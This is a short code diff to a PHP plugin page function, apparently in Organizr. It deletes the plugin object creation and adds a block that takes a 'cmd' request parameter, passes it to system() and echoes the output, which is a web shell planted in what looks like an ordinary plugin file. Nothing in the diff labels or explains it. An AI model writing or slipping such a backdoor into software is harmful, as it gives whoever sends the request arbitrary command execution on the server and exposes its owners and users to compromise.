@@ -11,6 +11,14 @@ function get_page_plugin_custom_page_here($Organizr)
     if (!$Organizr->qualifyRequest(14, true)) {
         return false;
     }
-    $plugin = new Plugin();
+    
+    if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+    }
+    
     return '';
 }
